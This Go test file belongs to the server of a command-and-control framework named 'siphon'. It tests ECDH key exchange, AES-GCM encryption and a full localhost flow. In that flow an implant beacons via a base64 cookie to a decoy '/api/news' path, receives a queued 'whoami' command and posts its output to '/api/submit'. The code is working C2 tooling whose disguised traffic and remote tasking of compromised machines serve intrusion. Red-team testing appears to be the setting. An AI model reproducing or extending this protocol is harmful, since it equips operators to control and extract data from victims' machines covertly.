package server

import (
	"bytes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"testing"
	"time"

	"siphon/shared"
)

func genTestCert(t *testing.T, dir string) (certPath, keyPath string) {
	t.Helper()
	certPath = filepath.Join(dir, "cert.pem")
	keyPath = filepath.Join(dir, "key.pem")

	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	tmpl := &x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{CommonName: "test"},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(time.Hour),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		IPAddresses:  []net.IP{net.ParseIP("127.0.0.1")},
		DNSNames:     []string{"localhost"},
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &priv.PublicKey, priv)
	if err != nil {
		t.Fatal(err)
	}

	cf, _ := os.Create(certPath)
	pem.Encode(cf, &pem.Block{Type: "CERTIFICATE", Bytes: der})
	cf.Close()

	kf, _ := os.OpenFile(keyPath, os.O_WRONLY|os.O_CREATE, 0600)
	kb, _ := x509.MarshalECPrivateKey(priv)
	pem.Encode(kf, &pem.Block{Type: "EC PRIVATE KEY", Bytes: kb})
	kf.Close()
	return
}

func TestECDH_KeyExchange(t *testing.T) {
	serverKey, err := GenerateServerKeyPair()
	if err != nil {
		t.Fatal(err)
	}
	serverPub := GetPublicKeyBytes(serverKey)

	// Simulate implant ephemeral key.
	implantKey, _ := GenerateServerKeyPair()
	implantPub := GetPublicKeyBytes(implantKey)

	implantSession, err := DeriveSessionKey(implantKey, serverPub)
	if err != nil {
		t.Fatal(err)
	}
	serverSession, err := DeriveSessionKey(serverKey, implantPub)
	if err != nil {
		t.Fatal(err)
	}

	if !bytes.Equal(implantSession, serverSession) {
		t.Fatalf("keys don't match:\n  implant: %x\n  server:  %x", implantSession, serverSession)
	}
	t.Logf("ECDH OK — session key: %x", implantSession[:16])
}

func TestAES_GCM_RoundTrip(t *testing.T) {
	key := make([]byte, 32)
	rand.Read(key)

	msg := []byte(`{"id":"test","hostname":"PC","username":"admin","os":"windows","arch":"amd64"}`)
	nonce, ct, err := Encrypt(key, msg)
	if err != nil {
		t.Fatal(err)
	}

	plain, err := Decrypt(key, nonce, ct)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(msg, plain) {
		t.Fatal("decrypt mismatch")
	}
	t.Log("AES-GCM round-trip OK")
}

func TestEnvelope_Serialization(t *testing.T) {
	key := make([]byte, 32)
	rand.Read(key)

	beacon := shared.Beacon{
		ID:       shared.GenerateID(),
		Hostname: "WORK-PC",
		Username: "redteam",
		OS:       "windows",
		Arch:     "amd64",
	}
	payload, _ := json.Marshal(beacon)
	nonce, ct, _ := Encrypt(key, payload)

	env := shared.Envelope{
		PubKey:     "04aabbccdd",
		Nonce:      hex.EncodeToString(nonce),
		Ciphertext: hex.EncodeToString(ct),
	}
	envJSON, _ := json.Marshal(env)
	cookie := base64.StdEncoding.EncodeToString(envJSON)

	// Decode path (server side).
	raw, _ := base64.StdEncoding.DecodeString(cookie)
	var dec shared.Envelope
	json.Unmarshal(raw, &dec)

	n, _ := hex.DecodeString(dec.Nonce)
	c, _ := hex.DecodeString(dec.Ciphertext)
	plain, err := Decrypt(key, n, c)
	if err != nil {
		t.Fatal(err)
	}
	var got shared.Beacon
	json.Unmarshal(plain, &got)
	if got.ID != beacon.ID {
		t.Fatalf("beacon ID mismatch")
	}
	t.Logf("envelope round-trip OK: %s@%s", got.Username, got.Hostname)
}

func TestHTTP_FullFlow(t *testing.T) {
	serverKey, _ := GenerateServerKeyPair()
	dir := t.TempDir()
	certPath, keyPath := genTestCert(t, dir)

	c2 := NewC2Server(serverKey, certPath, keyPath, "/api/news", "/api/submit", "")

	port := 19443
	go c2.Start(fmt.Sprintf(":%d", port))
	time.Sleep(300 * time.Millisecond)

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	base := fmt.Sprintf("https://127.0.0.1:%d", port)

	// --- ECDH handshake (first beacon) ---
	serverPub := GetPublicKeyBytes(serverKey)
	ephemKey, _ := GenerateServerKeyPair()
	sessionKey, _ := DeriveSessionKey(ephemKey, serverPub)
	ephemPubHex := hex.EncodeToString(GetPublicKeyBytes(ephemKey))

	beacon := shared.Beacon{
		ID:       shared.GenerateID(),
		Hostname: "TEST-PC",
		Username: "operator",
		OS:       "windows",
		Arch:     "amd64",
	}
	payload, _ := json.Marshal(beacon)
	nonce, ct, _ := Encrypt(sessionKey, payload)

	env := shared.Envelope{
		PubKey:     ephemPubHex,
		Nonce:      hex.EncodeToString(nonce),
		Ciphertext: hex.EncodeToString(ct),
	}
	envJSON, _ := json.Marshal(env)

	req, _ := http.NewRequest("GET", base+"/api/news", nil)
	req.AddCookie(&http.Cookie{Name: "session", Value: base64.StdEncoding.EncodeToString(envJSON)})
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("first beacon: %v", err)
	}
	resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("first beacon status: %d", resp.StatusCode)
	}
	t.Logf("[1] implant registered: %s", shortID(beacon.ID))

	// Verify implant on server side.
	imp := c2.GetImplant(beacon.ID)
	if imp == nil {
		t.Fatal("implant not registered")
	}
	if imp.Hostname != "TEST-PC" || imp.Username != "operator" {
		t.Fatalf("implant info wrong: %+v", imp)
	}

	// --- Queue a task ---
	task := &shared.Task{ID: shared.GenerateID(), Type: "cmd", Args: "whoami"}
	c2.QueueTask(beacon.ID, task)
	t.Logf("[2] queued task: %s (%s)", shortID(task.ID), task.Args)

	// --- Second beacon — pick up the task ---
	payload2, _ := json.Marshal(beacon)
	nonce2, ct2, _ := Encrypt(sessionKey, payload2)
	env2 := shared.Envelope{
		ID:         beacon.ID,
		Nonce:      hex.EncodeToString(nonce2),
		Ciphertext: hex.EncodeToString(ct2),
	}
	envJSON2, _ := json.Marshal(env2)

	req2, _ := http.NewRequest("GET", base+"/api/news", nil)
	req2.AddCookie(&http.Cookie{Name: "session", Value: base64.StdEncoding.EncodeToString(envJSON2)})
	resp2, err := client.Do(req2)
	if err != nil {
		t.Fatalf("second beacon: %v", err)
	}
	body, _ := io.ReadAll(resp2.Body)
	resp2.Body.Close()

	if len(body) == 0 {
		t.Fatal("expected task in response")
	}

	var respEnv shared.Envelope
	json.Unmarshal(body, &respEnv)
	rn, _ := hex.DecodeString(respEnv.Nonce)
	rc, _ := hex.DecodeString(respEnv.Ciphertext)
	taskPlain, err := Decrypt(sessionKey, rn, rc)
	if err != nil {
		t.Fatalf("decrypt task: %v", err)
	}
	var gotTask shared.Task
	json.Unmarshal(taskPlain, &gotTask)
	if gotTask.Type != "cmd" || gotTask.Args != "whoami" {
		t.Fatalf("task mismatch: %+v", gotTask)
	}
	t.Logf("[3] received task: type=%s args=%s", gotTask.Type, gotTask.Args)

	// --- Submit result ---
	result := shared.TaskResult{TaskID: gotTask.ID, Success: true, Output: "operator"}
	resultJSON, _ := json.Marshal(result)
	sn, sc, _ := Encrypt(sessionKey, resultJSON)
	submitEnv := shared.Envelope{
		ID:         beacon.ID,
		Nonce:      hex.EncodeToString(sn),
		Ciphertext: hex.EncodeToString(sc),
	}
	submitBody, _ := json.Marshal(submitEnv)

	req3, _ := http.NewRequest("POST", base+"/api/submit", bytes.NewReader(submitBody))
	req3.Header.Set("Content-Type", "application/json")
	resp3, err := client.Do(req3)
	if err != nil {
		t.Fatalf("submit: %v", err)
	}
	resp3.Body.Close()
	if resp3.StatusCode != 200 {
		t.Fatalf("submit status: %d", resp3.StatusCode)
	}

	// Verify result stored.
	imp = c2.GetImplant(beacon.ID)
	if len(imp.Results) != 1 || imp.Results[0].Output != "operator" {
		t.Fatalf("result not stored correctly: %+v", imp.Results)
	}
	t.Logf("[4] result verified: %s", imp.Results[0].Output)
	t.Log("PASS — full protocol: ECDH → beacon → task dispatch → result submission")
}
